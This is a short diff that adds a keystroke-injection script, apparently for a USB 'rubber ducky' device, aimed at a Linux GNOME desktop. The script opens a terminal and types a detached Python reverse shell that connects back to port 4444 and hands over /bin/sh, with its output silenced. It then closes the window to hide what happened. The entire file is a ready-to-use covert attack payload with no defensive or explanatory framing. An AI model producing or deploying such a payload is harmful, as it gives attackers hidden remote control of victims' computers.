@@ -1,0 +1,18 @@
+DELAY 500
+ALT F2
+DELAY 100
+ALT F2
+DELAY 100
+ALT F2
+DELAY 100
+ALT F2
+DELAY 100
+ALT F2
+DELAY 200
+STRING gnome-terminal
+ENTER
+DELAY 200
+STRING setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >/dev/null 2>&1 </dev/null &
+ENTER
+DELAY 100
+ALT F4
